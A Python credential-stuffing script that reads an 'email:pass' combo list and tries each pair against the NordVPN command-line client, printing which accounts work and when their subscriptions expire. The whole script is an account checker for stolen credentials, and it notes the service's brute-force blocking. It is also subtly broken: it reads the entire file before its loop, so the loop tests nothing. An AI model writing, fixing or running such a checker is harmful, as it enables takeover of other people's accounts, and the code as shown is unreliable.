import os
import subprocess
import sys
import argparse

# console colors
G = '\033[92m'  # Green
W = '\033[93m'  # Warning (yellow)
R = '\033[91m'  # Red
E = '\033[0m'   # Erase (the default color)
B = '\033[34m'  # Blue

# initiate argument parser
parser = argparse.ArgumentParser(
    description='Check NordVPN login'
)

# add argument to parser
parser.add_argument(
    '-f',
    '--file',
    help='The file that contains your email:pass',
    action='store',
    required=True,
    metavar='file'
)

args = parser.parse_args()

combo_file_path = args.file

if not os.path.isfile(combo_file_path):
    print('The path specified does not exist', combo_file_path)
    sys.exit()

# make sure you logged out of NordVPN
subprocess.run(['nordvpn', 'logout'], capture_output=True)

with open(combo_file_path) as combo_file:
    count = 0

    if not combo_file.read().strip():
        print('Given file is empty')
        sys.exit()

    for line in combo_file:
        count += 1

        if not line.strip():  # ignore empty lines in file
            continue

        email, password = line.strip().split(':')    # your combo file must be separated by `:`

        # making output more user friendly
        print(B + f'{count}) Checking ➜', W + f'{email}:{password}\r' + E, end='')

        login_result = subprocess.run(
            ['nordvpn', 'login', '-u', email, '-p', password],
            capture_output=True,
            text=True
        )

        if not login_result.returncode == 0:
            "This means that login was not successful"
            print(
                B + f'{count}) Checking ➜',
                W + f'{email}:{password}',
                '\t\t\t',
                R + 'Failed' + E
            )
            continue

        account_info = subprocess.run(
            ['nordvpn', 'account'],
            capture_output=True,
            text=True
        )

        # to make sure that `nordvpn account` gives correct output
        if 'You are not logged in.' in account_info.stdout:
            msg = R + f"""
            Something is wrong.
            To prevent brute force, NordVPN blocks your IP for a while.
            Try again later.
            """ + E
            print(msg)
            sys.exit()

        account_expiration_date = account_info.stdout.split('VPN Service: ')[1]

        print(
            B + f'{count}) Checking ➜',
            W + f'{email}:{password}\t\t',
            G + account_expiration_date.rstrip() + E
        )

        subprocess.run(
            ['nordvpn', 'logout'],
            capture_output=True
        )
